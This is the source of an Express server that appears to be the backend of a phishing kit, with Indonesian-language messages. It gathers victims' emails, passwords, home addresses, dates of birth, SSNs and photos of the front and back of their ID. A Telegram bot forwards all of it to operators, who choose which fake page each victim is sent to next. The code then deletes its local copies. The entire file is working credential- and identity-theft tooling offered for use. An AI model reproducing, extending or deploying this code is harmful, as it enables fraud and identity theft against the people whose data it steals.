const express = require('express');
const cors = require('cors');
const multer = require('multer');
const path = require('path');
const fs = require('fs-extra');
const TelegramBot = require('node-telegram-bot-api');
const { error } = require('console')

const app = express();
const port = 1000;

const botToken = 'YOUR_API_KEY_HERE';
const bot = new TelegramBot(botToken, { polling: true });

const chatIdFilePath = path.join(__dirname, 'chatid.json');

const readChatIds = () => {
  if (!fs.existsSync(chatIdFilePath)) {
    return [];
  }
  const data = fs.readFileSync(chatIdFilePath, 'utf8');
  return JSON.parse(data);
};

const saveChatIds = (chatIds) => {
  fs.writeFileSync(chatIdFilePath, JSON.stringify(chatIds, null, 2), 'utf8');
};

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const userName = msg.from.first_name;

  let chatIds = readChatIds();

  if (!chatIds.includes(chatId)) {
    chatIds.push(chatId);
    saveChatIds(chatIds);
  }

  bot.sendMessage(chatId, `Halo, ${userName}! Gas pake botnya bang!`);
  console.log(`Chat ID: ${chatId}`);
});

const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, 'uploads/');
  },
  filename: function (req, file, cb) {
    cb(null, file.originalname);
  },
});

const upload = multer({ storage: storage });

app.use(cors());
app.use(express.json());

let adminChoice = null;
let isApproved = false;

app.post('/save-input', upload.single('file'), async (req, res) => {
  const { email, password } = req.body;
  const file = req.file;

  try {
    const inputDir = path.join(__dirname, 'input');
    await fs.ensureDir(inputDir);

    const data = { email, password, fileName: null };
    if (file) {
      const fileName = Date.now() + path.extname(file.originalname);
      await fs.writeFile(path.join(inputDir, fileName), file.buffer);
      data.fileName = fileName;
    }

    await fs.writeJson(path.join(inputDir, 'page1.json'), data);
    res.status(200).send({ status: 'Input saved' });
  } catch (error) {
    console.error('Error saving input:', error);
    res.status(500).send({ status: 'Failed to save input' });
  }
});

app.post('/save-address-input', async (req, res) => {
  const { firstName, lastName, dob, citizenship, country, city, state, zipCode, address1, address2 } = req.body;

  try {
    const addressData = {
      firstName,
      lastName,
      dob,
      citizenship,
      country,
      city,
      state,
      zipCode,
      address1,
      address2
    };

    const inputDir = path.join(__dirname, 'input');
    await fs.ensureDir(inputDir);

    const addressFilePath = path.join(inputDir, 'address.json');
    await fs.writeJson(addressFilePath, addressData);

    res.status(200).send({ status: 'Address input saved successfully' });
  } catch (error) {
    console.error('Error saving address input:', error);
    res.status(500).send({ status: 'Failed to save address input' });
  }
});

app.post('/save-ssn-input', async (req, res) => {
  const { ssn } = req.body;

  try {
    const inputDir = path.join(__dirname, 'input');
    await fs.ensureDir(inputDir);

    const ssnFilePath = path.join(inputDir, 'ssn.json');
    await fs.writeJson(ssnFilePath, { ssn });

    res.status(200).send({ status: 'SSN input saved successfully' });
  } catch (error) {
    console.error('Error saving SSN input:', error);
    res.status(500).send({ status: 'Failed to save SSN input' });
  }
});

app.post('/request-approval', async (req, res) => {
  try {
    const inputDir = path.join(__dirname, 'input');
    const page1Data = await fs.readJson(path.join(inputDir, 'page1.json'));

    const page1Message = `Email: ${page1Data.email}\nPass: ${page1Data.password}`;

    const opts = {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'ID Page', callback_data: 'id-page' }],
          [{ text: 'Address Page', callback_data: 'address-page' }],
          [{ text: 'SSN Page', callback_data: 'ssn'}],
        ]
      }
    };

    const chatIds = readChatIds();
    console.log('Requesting approval from chatIds:', chatIds);

    for (const chatId of chatIds) {
      try {
        await bot.sendMessage(chatId, `User login :\n${page1Message}\nMau lanjut ke page mana?`, opts);
      } catch (error) {
        console.error(`Failed to send approval request to chatId ${chatId}:`, error);
      }
    }

    res.status(200).send({ status: 'Approval requested with Page 1 info' });
  } catch (error) {
    console.error('Error requesting approval with Page 1 info:', error);
    res.status(500).send({ status: 'Failed to request approval' });
  }
});

bot.on('callback_query', async (callbackQuery) => {
  const action = callbackQuery.data;

  if (action === 'id-page' || action === 'address-page' || action === 'ssn') {
    adminChoice = action;
    isApproved = true;

    await bot.sendMessage(callbackQuery.message.chat.id, `User diizinkan untuk melanjutkan ke ${action}.`);
    bot.answerCallbackQuery(callbackQuery.id);
  }
});

app.get('/check-approval', (req, res) => {
  res.status(200).send({ approved: isApproved, choice: adminChoice });
});

app.post('/upload-id', upload.fields([{ name: 'front' }, { name: 'back' }]), (req, res) => {
  const frontFile = req.files['front'][0];
  const backFile = req.files['back'][0];

  const newFileNames = {
    front: '1.jpg',
    back: '2.jpg',
  };

  fs.move(frontFile.path, path.join('uploads', newFileNames.front), { overwrite: true }, (err) => {
    if (err) {
      console.error('Gagal menyimpan front file:', err);
      return res.status(500).json({ message: 'Gagal menyimpan front file' });
    }
  });

  fs.move(backFile.path, path.join('uploads', newFileNames.back), { overwrite: true }, (err) => {
    if (err) {
      console.error('Gagal menyimpan back file:', err);
      return res.status(500).json({ message: 'Gagal menyimpan back file' });
    }
  });

  const fileNames = {
    front: newFileNames.front,
    back: newFileNames.back,
  };

  fs.writeFile('./input/img.json', JSON.stringify(fileNames, null, 2), (err) => {
    if (err) {
      console.error('Gagal menyimpan nama file ke JSON:', err);
      return res.status(500).json({ message: 'Gagal menyimpan nama file' });
    }

    res.json({ message: 'File berhasil diunggah dan nama disimpan ke JSON', fileNames });
  });
});

app.post('/send-all-inputs', async (req, res) => {
  try {
    const addressFilePath = path.join(__dirname, 'input', 'address.json');
    const page1FilePath = path.join(__dirname, 'input', 'page1.json');
    const ssnFilePath = path.join(__dirname, 'input', 'ssn.json');

    const frontImagePath = path.join(__dirname, 'uploads', '1.jpg');
    const backImagePath = path.join(__dirname, 'uploads', '2.jpg');

    const page1Data = await fs.readJson(page1FilePath);
    const ssnData = await fs.readJson(ssnFilePath);

    let message = `
      User Login Information : \n

      Email: ${page1Data.email}
      Password: ${page1Data.password}
      SSN : ${ssnData.ssn}
    `;

    try {
      const addressData = await fs.readJson(addressFilePath);
      message += `
        Name: ${addressData.firstName} ${addressData.lastName}
        Date of Birth: ${addressData.dob}
        Citizenship: ${addressData.citizenship}
        Country: ${addressData.country}
        City: ${addressData.city}
        State: ${addressData.state}
        Zip Code: ${addressData.zipCode}
        Address 1: ${addressData.address1}
        Address 2: ${addressData.address2}
      `;
    } catch (error) {
      if (error.code === 'ENOENT') {
        console.log('address.json tidak ditemukan, melanjutkan tanpa file ini.');
      } else {
        throw error;
      }
    }

    console.log(adminChoice);
    const chatIds = readChatIds();
    console.log('Sending data to chatIds:', chatIds);

    for (const chatId of chatIds) {
      try {
        await bot.sendMessage(chatId, message);
        console.log(`Data sent to chatId ${chatId}`);

        await bot.sendPhoto(chatId, frontImagePath, { caption: 'Front ID' });
        console.log(`Front ID sent to chatId ${chatId}`);

        await bot.sendPhoto(chatId, backImagePath, { caption: 'Back ID' });
        console.log(`Back ID sent to chatId ${chatId}`);

      } catch (error) {
        console.error(`Failed to send message or image to chatId ${chatId}:`, error);
      }
    }

    await fs.remove('input/address.json');
    await fs.remove('input/img.json');
    await fs.remove('input/page1.json');
    await fs.remove('input/ssn.json');
    await fs.remove('uploads/1.jpg');
    await fs.remove('uploads/2.jpg');

    res.status(200).send({ status: 'All inputs and images sent to Telegram successfully' });
  } catch (error) {
    console.error('Error sending all inputs and images to Telegram:', error);
    res.status(500).send({ status: 'Failed to send all inputs and images to Telegram' });
  }
});

app.listen(port, () => {
  console.log(`Server berjalan di http://localhost:${port}`);
});
